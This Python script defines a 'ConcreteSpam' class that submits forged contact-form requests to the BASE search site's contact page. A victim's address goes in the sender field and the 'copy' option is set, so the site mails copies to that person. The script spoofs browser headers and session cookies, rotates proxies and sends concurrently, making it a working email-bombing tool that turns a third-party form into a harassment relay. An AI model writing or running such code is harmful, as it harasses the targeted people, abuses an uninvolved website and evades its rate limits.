import requests

cookies = {
    'BASE': 'iq26gabl6if5p7m42fpa41j1o9eeivju',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    # 'Cookie': 'BASE=iq26gabl6if5p7m42fpa41j1o9eeivju',
    'Origin': 'https://www.base-search.net',
    'Pragma': 'no-cache',
    'Referer': 'https://www.base-search.net/about/en/contact.php',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'date': '1677667886',
            'sender': target,
            'request': self.get_text(),
            'copy': '1',
            'privacy_policy': '1',
            'sid': 'f12a9ea05b47696760990b456ab6169d',
        }

        response = requests.post('https://www.base-search.net/about/en/contact.php', cookies=cookies, headers=headers,
                                 data=data, proxies=self.get_proxies())

        return response


def main():
    s = 'successfully'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
